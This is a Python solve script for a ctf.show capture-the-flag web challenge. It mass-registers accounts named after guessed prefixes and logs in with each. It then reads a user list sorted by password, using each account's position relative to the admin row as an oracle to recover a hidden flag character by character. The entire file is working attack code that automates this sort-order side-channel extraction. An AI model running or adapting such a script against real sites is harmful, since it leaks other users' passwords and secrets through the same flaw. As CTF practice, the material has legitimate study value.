import requests

base_url = "http://c0a3b078-3cb6-4f39-a423-45355d29f563.challenge.ctf.show:8080/"
login_url = base_url + "login.php"
reg_url = base_url + "reg.php"
user_url = base_url + "user_main.php?order=pwd"


flagChars = "-.0123456789abcdefghijklmnopqrstuvwxyz{|}~"
# flagChars = "c"

flag = ""
for j in range(45):
    print(j)
    temp = ""
    for i in flagChars:
        # print("temp=" + temp)
        req_data = {
            "username": flag + str(i),
            "password": flag + str(i), 
            "email": 'aa@qq.com',
            "nickname": "aa",
        }

        session = requests.session()

        login_data = {'username': flag + str(i), "password": flag + str(i)}
        #print(req_data)
        reg_res = session.post(reg_url, data=req_data)
        #print(reg_res.text)
        login_res = session.post(login_url, data=login_data)
        #print(login_res.text)
        user_res = session.get(user_url)
        #print(user_res.text)
        a = user_res.text.find("<td>flag@ctf.show</td>")
        b = user_res.text.find("<td>" + flag + str(i) + "</td>")
        #print("a=" + str(a))
        #print("b=" + str(b))
        
        if ( a < b):
            flag = flag + temp
            print("flag = " + flag)
            break
        temp = str(i)


print(flag)
